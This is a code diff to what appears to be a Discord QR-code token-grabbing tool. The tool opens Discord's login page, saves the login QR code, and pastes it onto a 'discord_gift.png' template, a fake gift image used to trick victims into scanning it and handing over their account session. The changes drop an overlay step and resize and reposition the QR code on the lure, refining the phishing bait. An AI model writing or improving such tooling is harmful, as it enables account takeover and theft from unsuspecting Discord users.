@@ -46,22 +46,17 @@ def __save_to_file(result: str = None, save_file_name: str = None):
 
 
 @logger.catch
-def __logo_qr():
-    logger.debug("Pasting the overlay image onto the QR code.")
-    im1 = Image.open(os.path.join('image', 'qr_code.png'), 'r')
-    im2 = Image.open(os.path.join('image', 'overlay.png'), 'r')
-    im2_w, im2_h = im2.size
-    im1.paste(im2, (60, 55))
-    im1.save(os.path.join('image', 'final_qr.png'), quality=95)
-    logger.debug("Overlay image pasted successfully.")
-
-
-@logger.catch
 def __paste_template():
     logger.debug("Pasting the QR code onto the template.")
     im1 = Image.open(os.path.join('image', 'template.png'), 'r')
-    im2 = Image.open(os.path.join('image', 'final_qr.png'), 'r')
-    im1.paste(im2, (120, 409))
+    im2 = Image.open(os.path.join('image', 'qr_code.png'), 'r')
+    
+    # resize
+    scale_factor = 1.25
+    new_size = (int(im2.width * scale_factor), int(im2.height * scale_factor))
+    im2 = im2.resize(new_size, Image.Resampling.LANCZOS)
+    
+    im1.paste(im2, (91, 370)) 
     im1.save('discord_gift.png', quality=95)
     logger.debug("File saved to discord_gift.png")
 
@@ -158,7 +153,6 @@ def grabToken(time_to_wait = 3, save_file_name = True):
         logger.debug(f"Saved original QR code to: {file}")
 
     discord_login = driver.current_url
-    __logo_qr()
     __paste_template()
 
     logger.success('QR Code has been generated > ./discord_gift.png')
@@ -212,4 +206,5 @@ def main():
 
     
 if __name__ == '__main__':
-    main()
+    __paste_template()
+    # main()
